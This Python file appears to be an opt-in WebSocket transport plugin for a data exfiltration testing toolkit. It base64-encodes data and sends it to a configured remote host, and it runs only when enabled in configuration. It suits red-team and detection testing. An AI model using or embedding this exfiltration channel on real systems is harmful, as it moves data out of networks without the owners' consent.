"""Opt-in WebSocket transport for controlled lab servers."""

import base64

app_exfiltrate = None
config = None


def send(data):
    if not config.get('enabled', False):
        raise RuntimeError('websocket transport is disabled in configuration')
    import websocket

    payload = data.encode('utf-8') if isinstance(data, str) else data
    encoded = base64.b64encode(payload).decode('ascii')
    headers = ['X-DET-Lab: 1']
    for key, value in config.get('headers', {}).items():
        headers.append('{}: {}'.format(key, value))
    socket = websocket.create_connection(
        config['target'], header=headers,
        timeout=config.get('timeout', 10),
        http_proxy_host=config.get('proxy_host'),
        http_proxy_port=config.get('proxy_port'))
    try:
        app_exfiltrate.log_message(
            'info', '[websocket] Sending {} bytes'.format(len(payload)))
        socket.send(encoded)
    finally:
        socket.close()


class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        app_exfiltrate, config = app, conf
        if conf.get('enabled', False):
            app.register_plugin('websocket', {'send': send})
